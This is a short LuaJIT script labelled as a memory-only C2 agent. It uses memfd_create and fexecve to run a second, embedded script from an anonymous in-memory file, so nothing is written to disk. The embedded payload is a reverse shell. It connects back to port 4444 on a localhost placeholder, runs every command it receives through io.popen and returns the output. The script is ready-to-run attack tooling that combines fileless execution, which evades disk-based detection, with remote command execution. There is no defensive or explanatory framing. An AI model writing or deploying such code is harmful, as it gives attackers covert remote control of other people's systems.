#!/usr/bin/env luajit
-- c2/memfd_agent.lua - Memory-only agent

local ffi = require("ffi")

ffi.cdef[[
    int memfd_create(const char *name, unsigned int flags);
    int fexecve(int fd, char *const argv[], char *const envp[]);
    int fork(void);
    unsigned int sleep(unsigned int seconds);
]]

-- Create in-memory executable
local fd = ffi.C.memfd_create("vivisect_agent", 0)

-- Write our agent code to memory
local f = io.open(string.format("/proc/self/fd/%d", fd), "wb")
f:write([[#!/usr/bin/env luajit
-- Self-replicating memory agent
local socket = require("socket")

local client = assert(socket.connect("127.0.0.1", 4444))
client:send("VIVISECT_AGENT_MEMORY v1.0\n")

while true do
    local cmd = client:receive("*l")
    if not cmd then break end
    
    local handle = io.popen(cmd .. " 2>&1")
    local output = handle:read("*a")
    handle:close()
    client:send(output .. "\n")
end
]])
f:close()

-- Execute it in memory
if ffi.C.fork() == 0 then
    ffi.C.fexecve(fd, ffi.new("char*[2]", {"vivisect_agent", nil}), ffi.new("char*[1]", {nil}))
end

print("[+] Memory-only agent deployed")
